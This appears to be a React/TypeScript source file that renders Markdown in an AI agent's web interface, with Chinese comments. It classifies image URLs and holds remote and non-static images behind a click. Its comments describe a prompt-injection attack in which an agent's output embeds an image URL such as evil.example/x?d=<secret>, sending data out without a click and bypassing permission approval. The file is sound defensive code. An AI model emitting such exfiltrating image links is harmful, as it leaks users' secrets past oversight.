import { memo, useState, type ComponentProps } from 'react'
import ReactMarkdown, { defaultUrlTransform } from 'react-markdown'
import { ImageOff } from 'lucide-react'
import { useTranslation } from 'react-i18next'
import remarkGfm from 'remark-gfm'
import { CodeBlock } from './CodeBlock'

const remarkPlugins = [remarkGfm]

function langOf(className: string | undefined): string | undefined {
  const m = /language-([\w+-]+)/.exec(className ?? '')
  return m?.[1]
}

/** 浏览器自己就能显示、不会发请求的图片：内嵌的位图 `data:image/…` 和 `blob:`。（SVG 不放行。） */
const INLINE_IMAGE = /^(?:data:image\/(?:png|jpe?g|gif|webp|avif|bmp)[;,]|blob:)/i

/** react-markdown 默认会把 data: / blob: 的 src 清空；图片的这两种形式放行，其余走默认清洗（拦掉 javascript: 等）。 */
function urlTransform(url: string, key: string, node: { tagName?: string }): string {
  if (key === 'src' && node.tagName === 'img' && INLINE_IMAGE.test(url)) return url
  return defaultUrlTransform(url)
}

export type ImageSource = { kind: 'inline' } | { kind: 'static' } | { kind: 'remote'; host: string } | { kind: 'blocked' }

/**
 * 同源也不等于安全：`![](/x?d=<秘密>)` 不用点击就会把内容送到 hub（docs/spec/web.md § 4.6 消息流），`![](/assets/<秘密>)` 把数据放进路径里也一样。
 * 所以同源图片只直接加载 hub 自己下发的静态资源，并且收得很紧：
 * - 构建产物 `/assets/<文件名>`、图标目录 `/icons/<文件名>`：**只有一层**，文件名限 `[A-Za-z0-9._-]`、至多 `STATIC_NAME_MAX` 个字符
 *   （百分号编码、子目录、`@`、`~` 之类一律不放行——它们是往路径里塞数据的口子，构建产物的文件名里都没有）；
 * - 根目录下几个固定文件名；
 * - **不能带 query**（空的 `?` 也不行），不能带用户名 / 密码。
 * 其余同源路径和远程图片一样：占位 + 点击才加载。
 */
const STATIC_PREFIXES = ['/assets/', '/icons/']
const STATIC_FILES = new Set(['/favicon.svg', '/apple-touch-icon.png', '/icon-192.png', '/icon-512.png', '/icon-maskable-512.png'])
/** 静态文件名的字符集（Vite 的产物名是 `名字-哈希.扩展名`）。 */
const STATIC_NAME = /^[A-Za-z0-9._-]+$/
/** 静态文件名的长度上限：够放任何构建产物名，又不够往里面塞一段有用的数据。 */
export const STATIC_NAME_MAX = 128

function isStaticAsset(url: URL): boolean {
  if (url.href.includes('?') || url.username !== '' || url.password !== '') return false
  // `new URL` 已经把 `/assets/../x`、`%2e%2e` 之类规范化掉了，这里看到的是最终路径
  const path = url.pathname
  if (STATIC_FILES.has(path)) return true
  const prefix = STATIC_PREFIXES.find((p) => path.startsWith(p))
  if (!prefix) return false
  const name = path.slice(prefix.length)
  return name.length > 0 && name.length <= STATIC_NAME_MAX && STATIC_NAME.test(name) && name !== '.' && name !== '..'
}

/** 判断一个 Markdown 图片地址会不会让浏览器去访问 hub 的非静态路径或外部主机。 */
export function classifyImage(src: string, origin: string = location.origin): ImageSource {
  if (!src) return { kind: 'blocked' }
  if (INLINE_IMAGE.test(src)) return { kind: 'inline' }
  let url: URL
  try {
    url = new URL(src, origin)
  } catch {
    return { kind: 'blocked' }
  }
  if (url.protocol !== 'http:' && url.protocol !== 'https:') return { kind: 'blocked' }
  if (url.origin === origin && isStaticAsset(url)) return { kind: 'static' }
  return { kind: 'remote', host: url.host }
}

/**
 * Markdown 里的图片。agent 的输出可能被 prompt 注入，`![](https://evil.example/x?d=<秘密>)` 会让浏览器立刻发请求，
 * 绕过 daemon 的权限审批把数据送出去（docs/spec/web.md § 4.6 消息流；hub 的 CSP 见 docs/spec/hub.md § 2.1 安全头）。所以远程图片只显示一个占位按钮（带主机名），点了才加载；
 * 同源图片也一样，除非是 hub 自己的静态资源（见 `isStaticAsset`）。
 */
function MarkdownImage({ src, alt }: { src: string; alt?: string }) {
  const { t } = useTranslation()
  const [state, setState] = useState<'idle' | 'loaded' | 'failed'>('idle')
  const kind = classifyImage(src)
  if (kind.kind === 'blocked') return alt ? <span className="text-fg-subtle">{alt}</span> : null
  if (state === 'failed' && kind.kind === 'remote')
    // hub 的 CSP（img-src 'self' data: blob:）会拦掉远程图片：退回成一个普通链接，由用户自己决定要不要打开
    return (
      <a href={src} target="_blank" rel="noopener noreferrer" className="my-2 inline-flex max-w-full items-center gap-2 text-sm" data-testid="md-image-link">
        <ImageOff className="size-4 shrink-0" aria-hidden />
        <span className="min-w-0 truncate">{t('markdown.openImage', { host: kind.host })}</span>
      </a>
    )
  if (kind.kind === 'inline' || kind.kind === 'static' || state === 'loaded')
    return (
      <img
        src={src}
        alt={alt ?? ''}
        loading="lazy"
        decoding="async"
        referrerPolicy="no-referrer"
        className="my-2 max-w-full rounded-md"
        onError={() => kind.kind === 'remote' && setState('failed')}
      />
    )
  return (
    <button
      type="button"
      onClick={() => setState('loaded')}
      className="my-2 inline-flex max-w-full items-center gap-2 rounded-md border border-dashed border-border-strong bg-bg-subtle px-3 py-2 text-left text-sm text-fg-muted hover:bg-bg-hover"
      data-testid="md-image-placeholder"
      data-host={kind.host}
      title={t('markdown.imageHint')}
    >
      <ImageOff className="size-4 shrink-0" aria-hidden />
      <span className="min-w-0 truncate">{t('markdown.loadImage', { host: kind.host })}</span>
      {alt ? <span className="min-w-0 truncate text-fg-subtle">· {alt}</span> : null}
    </button>
  )
}

/**
 * Markdown 渲染。原始 HTML 不会被解释：没有用 rehype-raw，react-markdown 把 HTML 节点当作文本转义输出
 * （刻意没开 `skipHtml`——那会把 `Vec<String>` 里的 `<String>` 当成标签吞掉）。
 * `streaming` 为 true 时代码块不高亮、末尾带闪烁光标。
 */
export const Markdown = memo(function Markdown({ text, streaming }: { text: string; streaming?: boolean }) {
  return (
    <div className={streaming ? 'md stream-caret' : 'md'}>
      <ReactMarkdown
        remarkPlugins={remarkPlugins}
        urlTransform={urlTransform}
        components={{
          a: ({ node: _n, ...props }: ComponentProps<'a'> & { node?: unknown }) => <a {...props} target="_blank" rel="noopener noreferrer" />,
          img: ({ node: _n, src, alt }: ComponentProps<'img'> & { node?: unknown }) => <MarkdownImage src={typeof src === 'string' ? src : ''} alt={alt} />,
          pre: ({ children }) => <>{children}</>,
          code: ({ className, children, node: _n, ...props }: ComponentProps<'code'> & { node?: unknown }) => {
            const lang = langOf(className)
            const raw = String(children ?? '')
            if (lang || raw.includes('\n')) return <CodeBlock code={raw.replace(/\n$/, '')} lang={lang} streaming={streaming} />
            return (
              <code className={className} {...props}>
                {children}
              </code>
            )
          },
        }}
      >
        {text}
      </ReactMarkdown>
    </div>
  )
})
